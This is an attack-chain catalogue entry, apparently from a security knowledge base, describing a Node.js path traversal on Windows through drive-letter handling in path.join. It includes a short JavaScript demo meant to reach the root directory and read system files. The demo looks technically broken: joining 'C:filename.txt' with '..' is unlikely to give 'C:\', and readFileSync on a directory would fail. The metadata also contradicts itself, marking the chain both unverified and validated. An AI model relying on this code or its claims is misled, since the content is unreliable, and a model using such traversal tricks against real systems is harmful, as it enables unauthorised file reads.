---
id: ac-nodejs-pathtraversal-windows
name: >-
  Node.js Path Traversal via Drive Name Handling on Windows to Access Root
  Directory
tags:
  - path-traversal
  - nodejs
  - windows
  - file-access
type: attack_chain
tools: []
tactics:
  - '[[Discovery]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Demonstrate-Node.js-Path-Traversal-on-Windows]]'
step_count: 1
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:27.052Z'
description: >-
  An attack chain exploiting a path traversal vulnerability in Node.js path
  handling on Windows, where drive letters like 'C:' are misinterpreted,
  allowing access to the root directory instead of the current working
  directory.
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Node.js Path Traversal via Drive Name Handling on Windows to Access Root Directory

Multi-stage attack chain demonstrating exploitation of a path traversal vulnerability in Node.js on Windows systems, enabling unauthorized access to the root directory.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Vulnerable Node.js Script] --> B[Execute Path Traversal]
    B --> C[Access Root Directory Files]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Node.js installed on Windows

### Target Environment

- Windows OS
- Node.js runtime (affected versions prior to patch)

### Initial Access Requirements

- Local access to a Windows machine with Node.js
- Ability to execute Node.js scripts

## Detailed Attack Procedures

### Step 1: Demonstrate Path Traversal
procedure: [[procedures/Demonstrate-Node.js-Path-Traversal-on-Windows]]

**Objective**: Exploit the Node.js path.join function to traverse to the root directory using a drive letter prefix, bypassing intended relative path resolution.

**Instructions**: Create and execute a Node.js script that uses path.join with a path starting with 'C:' to read a file from the root directory, such as reading the contents of a system file like 'C:\Windows\System32\drivers\etc\hosts' but resolved incorrectly to root.

In the script, use require('path').join to construct the path and fs.readFileSync to attempt access:

```javascript
const path = require('path');
const fs = require('fs');

// Vulnerable usage: 'C:filename' treated as relative to root
let traversedPath = path.join('C:filename.txt', '..', '..'); // Attempts to go to root
console.log('Resolved path:', traversedPath);

try {
  let content = fs.readFileSync(traversedPath, 'utf8');
  console.log('File content:', content);
} catch (err) {
  console.error('Error accessing file:', err.message);
}
```

Save this as demo.js and run it with Node.js.

**Expected Output**: The path resolves to the root directory (e.g., 'C:\'), allowing read access to files there if permissions allow, demonstrating traversal beyond the current directory.

**Success Indicators**:
- Path resolves to root directory (e.g., output shows 'C:\')
- Successful read of a root-level file without expected relative path errors

## Attack Chain Summary

### Key Achievements

1. Successful path resolution to Windows root directory using drive letter prefix
2. Demonstration of file access traversal in Node.js applications
3. Highlighting medium-severity impact (CVSS 5.6) for potential unauthorized file reads

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Discovery]]

---
*Last updated: 2024-10-01T00:00:00Z*
